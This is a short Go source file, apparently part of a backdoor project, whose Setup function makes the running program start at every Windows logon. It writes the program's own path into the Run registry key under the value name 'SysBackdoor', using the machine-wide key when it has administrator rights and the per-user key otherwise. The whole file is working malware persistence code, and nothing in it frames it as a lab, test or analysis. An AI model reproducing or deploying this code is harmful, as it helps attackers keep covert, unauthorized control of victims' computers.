package persistence

import (
	"os"
	"os/exec"
)

type WindowsPersistence struct{}

func (w *WindowsPersistence) Setup() error {
	exePath, err := os.Executable()
	if err != nil {
		return err
	}

	if IsElevated() {
		return exec.Command("reg", "add", `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "SysBackdoor", "/d", exePath, "/f").Run()
	}

	return exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "SysBackdoor", "/d", exePath, "/f").Run()
}
